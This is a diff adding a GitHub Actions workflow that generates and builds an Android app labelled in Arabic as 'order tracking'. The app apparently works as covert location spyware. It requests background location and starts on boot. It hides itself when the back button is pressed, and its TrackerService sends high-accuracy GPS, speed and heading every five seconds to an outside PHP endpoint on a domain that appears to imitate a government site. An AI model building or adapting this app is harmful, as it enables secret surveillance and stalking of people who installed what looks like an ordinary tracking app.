@@ -1,0 +1,311 @@
+name: Build APK
+
+on: [push, workflow_dispatch]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-java@v5
+        with:
+          distribution: temurin
+          java-version: '17'
+
+      - name: Setup Android SDK
+        run: |
+          export ANDROID_HOME=/usr/local/lib/android/sdk
+          echo "ANDROID_HOME=$ANDROID_HOME" >> $GITHUB_ENV
+          echo "ANDROID_SDK_ROOT=$ANDROID_HOME" >> $GITHUB_ENV
+          echo "$ANDROID_HOME/cmdline-tools/latest/bin" >> $GITHUB_PATH
+          echo "$ANDROID_HOME/platform-tools" >> $GITHUB_PATH
+          
+          yes | $ANDROID_HOME/cmdline-tools/latest/bin/sdkmanager --licenses || true
+          $ANDROID_HOME/cmdline-tools/latest/bin/sdkmanager "platform-tools" "platforms;android-34" "build-tools;34.0.0"
+
+      - name: Create project
+        run: |
+          mkdir -p app/src/main/java/com/karim/tracker
+          mkdir -p app/src/main/res/layout
+          mkdir -p app/src/main/res/values
+          mkdir -p app/src/main/res/xml
+
+          cat > settings.gradle << 'SETTINGS_EOF'
+          pluginManagement {
+            repositories {
+              google()
+              mavenCentral()
+              gradlePluginPortal()
+            }
+          }
+          dependencyResolutionManagement {
+            repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
+            repositories {
+              google()
+              mavenCentral()
+            }
+          }
+          rootProject.name = "KarimTracker"
+          include ':app'
+          SETTINGS_EOF
+
+          cat > build.gradle << 'BUILD_EOF'
+          plugins {
+            id 'com.android.application' version '8.1.4' apply false
+          }
+          BUILD_EOF
+
+          cat > gradle.properties << 'PROPS_EOF'
+          android.useAndroidX=true
+          android.enableJetifier=true
+          org.gradle.jvmargs=-Xmx2048m
+          PROPS_EOF
+
+          cat > local.properties << 'LOCAL_EOF'
+          sdk.dir=/usr/local/lib/android/sdk
+          LOCAL_EOF
+
+          cat > app/build.gradle << 'APPGRADLE_EOF'
+          plugins { id 'com.android.application' }
+          android {
+            namespace 'com.karim.tracker'
+            compileSdk 34
+            defaultConfig {
+              applicationId "com.karim.tracker"
+              minSdk 23
+              targetSdk 34
+              versionCode 1
+              versionName "1.0"
+            }
+            compileOptions {
+              sourceCompatibility JavaVersion.VERSION_17
+              targetCompatibility JavaVersion.VERSION_17
+            }
+          }
+          dependencies {
+            implementation 'androidx.appcompat:appcompat:1.6.1'
+            implementation 'androidx.core:core:1.12.0'
+            implementation 'com.google.android.gms:play-services-location:21.1.0'
+          }
+          APPGRADLE_EOF
+
+          cat > app/src/main/AndroidManifest.xml << 'MANIFEST_EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <manifest xmlns:android="http://schemas.android.com/apk/res/android">
+              <uses-permission android:name="android.permission.INTERNET"/>
+              <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+              <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+              <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+              <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+              <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
+              <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION"/>
+              <uses-permission android:name="android.permission.WAKE_LOCK"/>
+              <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+              <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
+              <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
+              <application android:allowBackup="true"
+                  android:icon="@android:drawable/ic_menu_mylocation"
+                  android:label="@string/app_name"
+                  android:networkSecurityConfig="@xml/network_security_config"
+                  android:usesCleartextTraffic="true"
+                  android:theme="@style/Theme.AppCompat.Light.NoActionBar">
+                  <activity android:name=".MainActivity" android:exported="true" android:screenOrientation="portrait">
+                      <intent-filter>
+                          <action android:name="android.intent.action.MAIN"/>
+                          <category android:name="android.intent.category.LAUNCHER"/>
+                      </intent-filter>
+                  </activity>
+                  <service android:name=".TrackerService" android:enabled="true" android:exported="false" android:foregroundServiceType="location"/>
+                  <receiver android:name=".BootReceiver" android:enabled="true" android:exported="true">
+                      <intent-filter>
+                          <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                      </intent-filter>
+                  </receiver>
+              </application>
+          </manifest>
+          MANIFEST_EOF
+
+          cat > app/src/main/res/values/strings.xml << 'STRINGS_EOF'
+          <resources>
+              <string name="app_name">متابعة الطلب</string>
+          </resources>
+          STRINGS_EOF
+
+          cat > app/src/main/res/xml/network_security_config.xml << 'NETSEC_EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <network-security-config>
+              <base-config cleartextTrafficPermitted="true">
+                  <trust-anchors>
+                      <certificates src="system"/>
+                  </trust-anchors>
+              </base-config>
+          </network-security-config>
+          NETSEC_EOF
+
+          cat > app/src/main/res/layout/activity_main.xml << 'LAYOUT_EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
+              android:layout_width="match_parent"
+              android:layout_height="match_parent"
+              android:orientation="vertical"
+              android:gravity="center"
+              android:background="#0b3d2e">
+              <TextView
+                  android:layout_width="wrap_content"
+                  android:layout_height="wrap_content"
+                  android:text="متابعة الطلب"
+                  android:textColor="#c9a34a"
+                  android:textSize="26sp"
+                  android:textStyle="bold"/>
+          </LinearLayout>
+          LAYOUT_EOF
+
+          cat > app/src/main/java/com/karim/tracker/MainActivity.java << 'MAIN_EOF'
+          package com.karim.tracker;
+          import android.Manifest;
+          import android.content.Intent;
+          import android.content.pm.PackageManager;
+          import android.net.Uri;
+          import android.os.Build;
+          import android.os.Bundle;
+          import android.os.PowerManager;
+          import android.provider.Settings;
+          import android.widget.Toast;
+          import androidx.annotation.NonNull;
+          import androidx.appcompat.app.AppCompatActivity;
+          import androidx.core.app.ActivityCompat;
+          public class MainActivity extends AppCompatActivity {
+              @Override protected void onCreate(Bundle s) {
+                  super.onCreate(s);
+                  setContentView(R.layout.activity_main);
+                  String[] perms;
+                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                      perms = new String[]{Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION, Manifest.permission.POST_NOTIFICATIONS};
+                  } else {
+                      perms = new String[]{Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION};
+                  }
+                  ActivityCompat.requestPermissions(this, perms, 1001);
+                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                      PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
+                      if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
+                          Intent i = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
+                          i.setData(Uri.parse("package:" + getPackageName()));
+                          try { startActivity(i); } catch (Exception e) {}
+                      }
+                  }
+              }
+              @Override public void onRequestPermissionsResult(int rc, @NonNull String[] p, @NonNull int[] g) {
+                  super.onRequestPermissionsResult(rc, p, g);
+                  Intent svc = new Intent(this, TrackerService.class);
+                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(svc);
+                  else startService(svc);
+                  Toast.makeText(this, "المتابعة مفعّلة", Toast.LENGTH_LONG).show();
+              }
+              @Override public void onBackPressed() { moveTaskToBack(true); }
+          }
+          MAIN_EOF
+
+          cat > app/src/main/java/com/karim/tracker/BootReceiver.java << 'BOOT_EOF'
+          package com.karim.tracker;
+          import android.content.BroadcastReceiver;
+          import android.content.Context;
+          import android.content.Intent;
+          import android.os.Build;
+          public class BootReceiver extends BroadcastReceiver {
+              @Override public void onReceive(Context c, Intent i) {
+                  if (Intent.ACTION_BOOT_COMPLETED.equals(i.getAction())) {
+                      Intent svc = new Intent(c, TrackerService.class);
+                      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) c.startForegroundService(svc);
+                      else c.startService(svc);
+                  }
+              }
+          }
+          BOOT_EOF
+
+          cat > app/src/main/java/com/karim/tracker/TrackerService.java << 'SERVICE_EOF'
+          package com.karim.tracker;
+          import android.app.*;
+          import android.content.*;
+          import android.location.Location;
+          import android.os.*;
+          import androidx.core.app.NotificationCompat;
+          import com.google.android.gms.location.*;
+          import java.io.OutputStream;
+          import java.net.HttpURLConnection;
+          import java.net.URL;
+          import java.net.URLEncoder;
+          public class TrackerService extends Service {
+              private static final String CHANNEL_ID = "karim";
+              private static final String URL_SRV = "https://tajnedgovsa.com/live_save.php";
+              private static final String CODE = "3481240327";
+              private String sid;
+              @Override public void onCreate() {
+                  super.onCreate();
+                  SharedPreferences p = getSharedPreferences("t", MODE_PRIVATE);
+                  sid = p.getString("sid", null);
+                  if (sid == null) { sid = "native_" + System.currentTimeMillis(); p.edit().putString("sid", sid).apply(); }
+                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                      NotificationChannel ch = new NotificationChannel(CHANNEL_ID, "متابعة", NotificationManager.IMPORTANCE_LOW);
+                      NotificationManager nm = getSystemService(NotificationManager.class);
+                      if (nm != null) nm.createNotificationChannel(ch);
+                  }
+                  Notification n = new NotificationCompat.Builder(this, CHANNEL_ID)
+                      .setContentTitle("متابعة الطلب")
+                      .setContentText("جاري المتابعة")
+                      .setSmallIcon(android.R.drawable.ic_menu_mylocation)
+                      .setOngoing(true)
+                      .build();
+                  startForeground(1001, n);
+                  FusedLocationProviderClient fc = LocationServices.getFusedLocationProviderClient(this);
+                  LocationRequest req = new LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, 5000).build();
+                  try {
+                      fc.requestLocationUpdates(req, new LocationCallback() {
+                          @Override public void onLocationResult(LocationResult r) {
+                              if (r == null) return;
+                              for (Location loc : r.getLocations()) send(loc);
+                          }
+                      }, Looper.getMainLooper());
+                  } catch (SecurityException e) {}
+              }
+              private void send(Location loc) {
+                  new Thread(() -> {
+                      try {
+                          String p = "lat=" + URLEncoder.encode(String.valueOf(loc.getLatitude()),"UTF-8") +
+                              "&lon=" + URLEncoder.encode(String.valueOf(loc.getLongitude()),"UTF-8") +
+                              "&acc=" + URLEncoder.encode(String.valueOf(loc.getAccuracy()),"UTF-8") +
+                              "&src=GPS&spd=" + (loc.getSpeed()*3.6) +
+                              "&hdg=" + loc.getBearing() +
+                              "&mode=car&conf=0.95" +
+                              "&code=" + CODE + "&sid=" + sid;
+                          HttpURLConnection c = (HttpURLConnection) new URL(URL_SRV).openConnection();
+                          c.setRequestMethod("POST");
+                          c.setDoOutput(true);
+                          c.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
+                          OutputStream os = c.getOutputStream();
+                          os.write(p.getBytes("UTF-8"));
+                          os.close();
+                          c.getResponseCode();
+                      } catch (Exception e) {}
+                  }).start();
+              }
+              @Override public int onStartCommand(Intent i, int f, int s) { return START_STICKY; }
+              @Override public IBinder onBind(Intent i) { return null; }
+          }
+          SERVICE_EOF
+
+      - name: Setup Gradle Wrapper
+        run: gradle wrapper --gradle-version 8.5
+
+      - name: Build APK
+        run: |
+          chmod +x gradlew
+          ./gradlew assembleDebug --no-daemon --stacktrace
+
+      - name: Upload APK
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: KarimTracker-APK
+          path: app/build/outputs/apk/debug/*.apk
+          if-no-files-found: warn
